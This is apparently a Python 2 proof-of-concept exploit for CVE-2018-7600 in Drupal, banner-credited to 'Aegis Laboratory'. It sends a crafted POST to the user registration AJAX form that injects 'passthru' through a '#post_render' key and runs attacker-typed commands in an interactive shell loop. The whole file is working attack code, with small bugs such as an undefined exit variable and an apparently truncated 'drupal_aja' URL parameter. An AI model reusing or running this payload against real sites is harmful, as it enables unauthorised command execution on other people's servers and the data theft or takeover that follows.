#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
def Usage():
    print'     ,           ,'
    print'    /             \\'
    print'   ((__---,,,---__))'
    print'      (_) O O (_)_________'
    print'         \ _ /            |\\'
    print'          o_o \   Loading | \\'
    print'               \   _____  |  *'
    print'                |||   WW|||'
    print '                |||     |||'
    print '               |||     |||'

    print '       =====>Aegis Laboratory<====='

    print '################################################################'
    print '# Remote command execution'
    print '# Proof-Of-Concept for CVE-2018-7600'
    print '# Usage: http://127.0.0.1'
    print '################################################################'


def main(url):
    try:
        while True:
            Command = raw_input('~$ ')
            Command = Command.rstrip()
            if Command == "" :
                continue
            if Command=="exit":
                sys.exit(n)
            run(Command,url)
    except:
        pass
def run(cmd,url):
    Command=cmd

    payload = {
        'form_id': 'user_register_form', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup',
        'mail[#markup]': Command
    }
    r = requests.post(url, data=payload)
    if r.status_code != 200:
        sys.exit("Not exploitable")
    print r.text

def Verification():

    if (len(sys.argv) == 2):
        target = sys.argv[1]
        url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_aja'
        if (requests.get(url).status_code) == 200:
            main(url)
        else:
                sys.exit('There may be no loopholes in the attack failure')
    else:
        Usage()
  
if __name__ == '__main__':
    Verification()
